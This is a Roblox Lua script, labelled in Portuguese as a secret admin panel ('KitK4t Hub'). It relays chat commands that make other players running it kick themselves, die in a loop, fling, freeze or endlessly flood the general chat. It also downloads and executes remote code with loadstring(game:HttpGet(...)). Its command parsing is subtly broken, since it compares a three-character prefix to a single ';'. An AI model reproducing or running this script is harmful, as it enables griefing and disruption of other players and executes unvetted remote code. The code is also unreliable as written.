local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local function SendCommandMessage(command, target)
    local channel = TextChatService.TextChannels.RBXGeneral
    if channel then
        local msg = ";" .. command
        if target then msg = msg .. " " .. target end
        channel:SendAsync(msg)
    end
end

local function GetCharacter(playerName)
    local plr = Players:FindFirstChild(playerName)
    if plr then
        return plr.Character
    end
    return nil
end

local function Kick(playerName)
    if playerName == LocalPlayer.Name then
        LocalPlayer:Kick("Você foi removido pelo KitK4t Hub.")
    end
end

local loopKill = false
local function LoopKill(playerName)
    if playerName == LocalPlayer.Name then
        loopKill = not loopKill
        if loopKill then
            task.spawn(function()
                while loopKill do
                    if LocalPlayer.Character then
                        LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
                    end
                    task.wait(0.3)
                end
            end)
        end
    end
end

local function KillPlus(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            char:BreakJoints()
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace

                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part

                    game.Debris:AddItem(part, 3)
                end
            end
        end
    end
end

local function Fling(playerName)
    if playerName == LocalPlayer.Name then
        local char = GetCharacter(LocalPlayer.Name)
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                local targetCFrame = CFrame.new(50000,5000000,3972823)
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local tween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                tween:Play()
            end
        end
    end
end

local function Freeze(playerName)
    if playerName == LocalPlayer.Name then
        local character = LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.Anchored = true
        end
    end
end

local function UnFreeze(playerName)
    if playerName == LocalPlayer.Name then
        local character = LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.Anchored = false
        end
    end
end

local function Bring(playerName)
    local target = Players:FindFirstChild(playerName)
    if target and target.Character and LocalPlayer.Character then
        local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
        local localRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot and localRoot then
            targetRoot.CFrame = localRoot.CFrame + Vector3.new(0,3,0)
        end
    end
end

local function Verifique()
    local channel = TextChatService.TextChannels.RBXGeneral
    if channel then
        local randomNumber = math.random(1000,9999)
        channel:SendAsync("KitK4t_"..randomNumber)
    end
end

local function TimeoutRoblox()
    task.spawn(function()
        local channel = TextChatService.TextChannels.RBXGeneral
        while true do
            if channel then
                channel:SendAsync("##########")
            end
            task.wait(0)
        end
    end)
end

TextChatService.OnIncomingMessage = function(message)
    local text = message.Text
    if string.sub(text, 1, 3) == ";" then
        local args = string.split(text, " ")
        local command = string.lower(string.sub(args[1], 4))
        local target = args[2]

        if command == "kick" then Kick(target) end
        if command == "loopkill" then LoopKill(target) end
        if command == "killplus" then KillPlus(target) end
        if command == "fling" then Fling(target) end
        if command == "freeze" then Freeze(target) end
        if command == "unfreeze" then UnFreeze(target) end
        if command == "bring" then Bring(target) end
        if command == "verifique" then Verifique() end
        if command == "timeoutroblox" then TimeoutRoblox() end
    end
end

task.delay(2, function()
    local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()

    local Window = Rayfield:CreateWindow({
        Name = "KitK4t Hub - Admin Painel",
        LoadingTitle = "Script Secreto de Administradores",
        LoadingSubtitle = "by Bazuka",
        KeySystem = true,
        KeySettings = {
            Title = "Se já abriu, ignore isso",
            Subtitle = "Não é necessário inserir key novamente.",
            Note = "© KitK4t Hub Developers 2025",
            FileName = "KitK4tKey",
            SaveKey = true,
            Key = "0000-batata-frita"
        }
    })

    local MainTab = Window:CreateTab("Principal", 4483362458)

    local function GetPlayersList()
        local list = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                table.insert(list, plr.Name)
            end
        end
        return list
    end

    local playerList = GetPlayersList()
    local SelectedPlayer = playerList[1]

    local PlayerDropdown = MainTab:CreateDropdown({
        Name = "Selecionar Jogador",
        Options = playerList,
        CurrentOption = SelectedPlayer,
        MultiSelection = false,
        Flag = "DropdownPlayers",
        Callback = function(Value)
            SelectedPlayer = Value
        end
    })

    Players.PlayerAdded:Connect(function()
        PlayerDropdown:Refresh(GetPlayersList())
    end)
    Players.PlayerRemoving:Connect(function()
        PlayerDropdown:Refresh(GetPlayersList())
    end)

    local commands = {
        {Name=";kick", Command="kick"},
        {Name=";loopkill", Command="loopkill"},
        {Name=";killplus", Command="killplus"},
        {Name=";fling", Command="fling"},
        {Name=";freeze", Command="freeze"},
        {Name=";unfreeze", Command="unfreeze"},
        {Name=";bring", Command="bring"},
        {Name=";verifique", Command="verifique"},
        {Name=";timeoutroblox", Command="timeoutroblox"}
    }

    for _, cmd in ipairs(commands) do
        MainTab:CreateButton({
            Name = cmd.Name,
            Callback = function()
                if cmd.Command == "verifique" or cmd.Command == "timeoutroblox" then
                    SendCommandMessage(cmd.Command)
                else
                    SendCommandMessage(cmd.Command, SelectedPlayer)
                end
            end
        })
    end
end)
